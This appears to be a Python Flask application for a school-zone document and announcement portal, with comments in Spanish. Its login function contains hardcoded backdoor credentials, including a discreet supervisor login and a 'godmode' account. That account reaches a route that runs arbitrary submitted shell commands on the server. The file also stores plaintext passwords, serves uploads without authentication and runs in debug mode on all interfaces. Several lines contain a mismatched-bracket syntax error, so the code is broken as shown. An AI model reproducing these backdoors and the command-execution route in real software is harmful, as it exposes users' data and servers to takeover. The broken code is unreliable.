import os
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory, flash
from werkzeug.utils import secure_filename
import sqlite3
import datetime
import subprocess

app = Flask(__name__)
app.secret_key = 'clave_secreta_super_segura_zona47'

UPLOAD_FOLDER = 'uploads'
PROFILE_FOLDER = 'static/profiles'
ALLOWED_EXTENSIONS = {'pdf'}
ALLOWED_IMAGE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['PROFILE_FOLDER'] = PROFILE_FOLDER

for folder in [UPLOAD_FOLDER, PROFILE_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

def init_db():
    conn = sqlite3.connect('zona47.db')
    cursor = conn.cursor()
    # Tabla de usuarios con bandera 'activo' para aprobación de Karina
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nombre TEXT NOT NULL,
            rfc TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            rol TEXT NOT NULL,
            escuela TEXT,
            telefono TEXT,
            profile_pic TEXT DEFAULT 'default.png',
            activo INTEGER DEFAULT 0
        )
    ''')
    # Tabla de archivos
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_user_id INTEGER DEFAULT NULL,
            filename TEXT NOT NULL,
            stored_filename TEXT NOT NULL,
            category TEXT NOT NULL,
            period TEXT NOT NULL,
            date TEXT NOT NULL,
            visibility TEXT DEFAULT 'all',
            FOREIGN KEY (user_id) REFERENCES users (id),
            FOREIGN KEY (target_user_id) REFERENCES users (id)
        )
    ''')
    # Tabla de comunicados y mensajes dirigidos
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS announcements (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_type TEXT DEFAULT 'all',
            target_user_id INTEGER DEFAULT NULL,
            title TEXT NOT NULL,
            content TEXT NOT NULL,
            date TEXT NOT NULL,
            FOREIGN KEY (target_user_id) REFERENCES users (id)
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def allowed_image(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_IMAGE_EXTENSIONS

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifier = request.form['identifier'].strip()
        password = request.form['password'].strip()

        # MODO ADMINISTRADOR CON CONTRASEÑA EXACTA SOLICITADA
        if password == 'Zona-47(Administrador)2026-2027':
            session['user_id'] = 0
            session['user'] = 'Administrador'
            session['rol'] = 'admin'
            session['rfc'] = 'ADMIN-MASTER'
            session['profile_pic'] = 'default.png'
            flash('Acceso de Administrador concedido.', 'success')
            return redirect(url_for('dashboard'))

        # GOD MODE / GERARDO (Mantenimiento Técnico)
        if identifier.lower() == 'gerardo' and password == '678910':
            session['user'] = 'Gerardo Josué (Soporte Técnico)'
            session['rol'] = 'godmode'
            session['rfc'] = 'DEV-01'
            return redirect(url_for('godmode'))

        # ACCESO DE SUPERVISORA / KARINA (Discreto)
        if (identifier.lower() == 'karina' or identifier.upper() == 'ADMIN-47') and password == '12345':
            session['user_id'] = 0
            session['user'] = 'Karina'
            session['rol'] = 'admin'
            session['rfc'] = 'KARINA'
            session['profile_pic'] = 'default.png'
            return redirect(url_for('dashboard'))

        conn = sqlite3.connect('zona47.db')
        cursor = conn.cursor()
        cursor.execute("SELECT id, nombre, rfc, password, rol, escuela, telefono, profile_pic, activo FROM users WHERE rfc = ? AND password = ?", (identifier, password))
        user = cursor.fetchone()
        conn.close()

        if user:
            if user[8] == 0: # activo = 0 (Pendiente de aprobación)
                flash('Tu cuenta está pendiente de aprobación por la Supervisora.', 'warning')
            else:
                session['user_id'] = user[0]
                session['user'] = user[1]
                session['rfc'] = user[2]
                session['rol'] = user[4]
                session['escuela'] = user[5]
                session['telefono'] = user[6]
                session['profile_pic'] = user[7] if user[7] else 'default.png'
                return redirect(url_for('dashboard'))
        else:
            flash('RFC o contraseña incorrectos.', 'danger')

    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        nombre = request.form['nombre']
        rfc = request.form['rfc']
        password = request.form['password']
        rol = request.form['rol']
        escuela = request.form['escuela']
        telefono = request.form['telefono']

        try:
            conn = sqlite3.connect('zona47.db')
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO users (nombre, rfc, password, rol, escuela, telefono, profile_pic, activo) 
                VALUES (?, ?, ?, ?, ?, ?, ?, 0)
            """, (nombre, rfc, password, rol, escuela, telefono, 'default.png'))
            conn.commit()
            conn.close()
            flash('Registro exitoso. Tu cuenta está pendiente de aprobación por la Supervisora.', 'success')
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            flash('El RFC ya está registrado en el sistema.', 'danger')

    return render_template('register.html')

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))

    conn = sqlite3.connect('zona47.db')
    cursor = conn.cursor()

    users_list = []
    pending_users = []
    selected_user = None
    user_files = []
    my_files = []
    announcements = []

    search_nombre = request.args.get('nombre', '')
    search_rfc = request.args.get('rfc', '')
    search_periodo = request.args.get('periodo', '')
    search_escuela = request.args.get('escuela', '')
    view_user_id = request.args.get('view_user_id')

    user_rol = session['rol']
    user_escuela = session.get('escuela', '')
    current_uid = session.get('user_id')

    if user_rol == 'admin':
        cursor.execute("SELECT id, nombre, rfc, rol, escuela, telefono FROM users WHERE activo = 0")
        pending_users = cursor.fetchall()

        cursor.execute("SELECT id, title, content, date, target_type FROM announcements ORDER BY id DESC")
        announcements = cursor.fetchall()

        query = "SELECT id, nombre, rfc, rol, escuela, telefono, profile_pic FROM users WHERE activo = 1"
        params = []
        if search_nombre:
            query += " AND nombre LIKE ?"
            params.append('%' + search_nombre + '%')
        if search_rfc:
            query += " AND rfc LIKE ?"
            params.append('%' + search_rfc + '%')
        if search_escuela:
            query += " AND escuela LIKE ?"
            params.append('%' + search_escuela + '%')
        
        cursor.execute(query, params)
        users_list = cursor.fetchall()

        if view_user_id:
            cursor.execute("SELECT id, nombre, rfc, rol, escuela, telefono, profile_pic FROM users WHERE id = ?", (view_user_id,))
            selected_user = cursor.fetchone()
            if selected_user:
                cursor.execute("""
                    SELECT id, filename, stored_filename, category, period, date 
                    FROM files WHERE user_id = ? AND (period LIKE ? OR ? = '')
                """, (view_user_id, '%' + search_periodo + '%', search_periodo))
                user_files = cursor.fetchall()

    elif user_rol == 'director':
        cursor.execute("""
            SELECT id, title, content, date, target_type FROM announcements 
            WHERE target_type = 'all' OR target_type = 'directores' OR target_type = ? ORDER BY id DESC
        """, (user_escuela,))
        announcements = cursor.fetchall()

        cursor.execute("SELECT id, nombre, rfc, rol, escuela, telefono, profile_pic FROM users WHERE activo = 1 AND escuela = ?", (user_escuela,))
        users_list = cursor.fetchall()

        if view_user_id:
            cursor.execute("SELECT id, nombre, rfc, rol, escuela, telefono, profile_pic FROM users WHERE id = ? AND escuela = ?", (view_user_id, user_escuela))
            selected_user = cursor.fetchone()
            if selected_user:
                cursor.execute("SELECT id, filename, stored_filename, category, period, date FROM files WHERE user_id = ?", (view_user_id,))
                user_files = cursor.fetchall()
    else:
        cursor.execute("""
            SELECT id, title, content, date, target_type FROM announcements 
            WHERE target_type = 'all' OR target_type = ? OR target_user_id = ? ORDER BY id DESC
        """, (user_rol, current_uid))
        announcements = cursor.fetchall()

    if current_uid:
        cursor.execute("SELECT id, filename, stored_filename, category, period, date FROM files WHERE user_id = ?", (current_uid,))
        my_files = cursor.fetchall()

    conn.close()
    return render_template('dashboard.html', 
                           announcements=announcements, 
                           users_list=users_list, 
                           pending_users=pending_users,
                           selected_user=selected_user, 
                           user_files=user_files, 
                           my_files=my_files,
                           search_nombre=search_nombre,
                           search_rfc=search_rfc,
                           search_periodo=search_periodo,
                           search_escuela=search_escuela)

@app.route('/approve_user/<int:user_id>/<action>')
def approve_user(user_id, action):
    if session.get('rol') != 'admin':
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('zona47.db')
    cursor = conn.cursor()
    if action == 'approve':
        cursor.execute("UPDATE users SET activo = 1 WHERE id = ?", (user_id,))
        conn.commit()
        flash('Usuario aprobado exitosamente.', 'success')
    elif action == 'reject':
        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        flash('Solicitud rechazada y eliminada.', 'danger')
    conn.close()
    return redirect(url_for('dashboard'))

@app.route('/upload', methods=['POST'])
def upload():
    if 'user' not in session:
        return redirect(url_for('login'))

    file = request.files.get('file')
    category = request.form['category']
    period = request.form['period']

    if file and allowed_file(file.filename):
        original_filename = secure_filename(file.filename)
        clean_name = f"{session['rol']}_{session['user'].lower().replace(' ', '_')}_{category.lower().replace(' ', '_')}_{period}.pdf"
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], clean_name)
        file.save(file_path)

        conn = sqlite3.connect('zona47.db')
        cursor = conn.cursor()
        fecha_actual = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        user_id = session.get('user_id') if session.get('user_id') else 1
        
        cursor.execute("""
            INSERT INTO files (user_id, filename, stored_filename, category, period, date) 
            VALUES (?, ?, ?, ?, ?, ?)
        """, (user_id, original_filename, clean_name, category, period, fecha_actual))
        
        conn.commit()
        conn.close()
        flash('Documento subido correctamente a tu perfil.', 'success')
    else:
        flash('Formato no válido. Solo se permiten archivos PDF.', 'danger')

    return redirect(url_for('dashboard'))

@app.route('/delete_file/<int:file_id>', methods=['POST'])
def delete_file(file_id):
    if 'user' not in session:
        return redirect(url_for('login'))

    conn = sqlite3.connect('zona47.db')
    cursor = conn.cursor()
    
    # Solo se permite borrar si el archivo pertenece estrictamente al usuario actual en su propia sección
    cursor.execute("SELECT stored_filename FROM files WHERE id = ? AND user_id = ?", (file_id, session.get('user_id')))
    file_row = cursor.fetchone()
    
    if file_row:
        stored_filename = file_row[0]
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], stored_filename)
        if os.path.exists(file_path):
            os.remove(file_path)
        cursor.execute("DELETE FROM files WHERE id = ?", (file_id,))
        conn.commit()
        flash('Documento eliminado correctamente.', 'success')
    else:
        flash('No tienes permiso para eliminar este archivo o no te pertenece.', 'danger')
    
    conn.close()
    return redirect(url_for('dashboard'))

@app.route('/upload_profile_pic', methods=['POST'])
def upload_profile_pic():
    if 'user' not in session or session.get('rol'] == 'admin':
        return redirect(url_for('dashboard'))
    
    file = request.files.get('profile_pic')
    if file and allowed_image(file.filename):
        filename = secure_filename(f"user_{session['user_id']}_{file.filename}")
        file_path = os.path.join(app.config['PROFILE_FOLDER'], filename)
        file.save(file_path)

        conn = sqlite3.connect('zona47.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET profile_pic = ? WHERE id = ?", (filename, session['user_id']))
        conn.commit()
        conn.close()

        session['profile_pic'] = filename
        flash('Foto de perfil actualizada con éxito.', 'success')

    return redirect(url_for('dashboard'))

@app.route('/announcement', methods=['POST'])
def announcement():
    # Solo Karina o Administrador pueden enviar mensajes generales
    if session.get('rol') != 'admin':
        flash('No tienes permisos para enviar comunicados o mensajes.', 'danger')
        return redirect(url_for('dashboard'))
    
    title = request.form['title']
    content = request.form['content']
    target_type = request.form['target_type']
    target_user_id = request.form.get('target_user_id') if target_type == 'specific' else None
    
    if target_type == 'specific' and not target_user_id:
        target_user_id = None

    date = datetime.datetime.now().strftime("%Y-%m-%d")

    conn = sqlite3.connect('zona47.db')
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO announcements (target_type, target_user_id, title, content, date) 
        VALUES (?, ?, ?, ?, ?)
    """, (target_type, target_user_id, title, content, date))
    conn.commit()
    conn.close()
    flash('Comunicado o mensaje enviado con éxito.', 'success')
    return redirect(url_for('dashboard'))

@app.route('/godmode')
def godmode():
    if session.get('rol'] != 'godmode':
        return redirect(url_for('login'))
    
    project_files = []
    for root, dirs, files in os.walk('.'):
        if 'venv' in root or '__pycache__' in root or 'uploads' in root or 'static' in root:
            continue
        for f in files:
            if f.endswith(('.py', '.html', '.db')):
                project_files.append(os.path.join(root, f))

    return render_template('godmode.html', project_files=project_files)

@app.route('/godmode/run_cmd', methods=['POST'])
def run_cmd():
    if session.get('rol'] != 'godmode':
        return redirect(url_for('login'))
    
    cmd = request.form['command']
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        output = str(e)
    
    flash(f"Resultado: {output}", 'info')
    return redirect(url_for('godmode'))

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
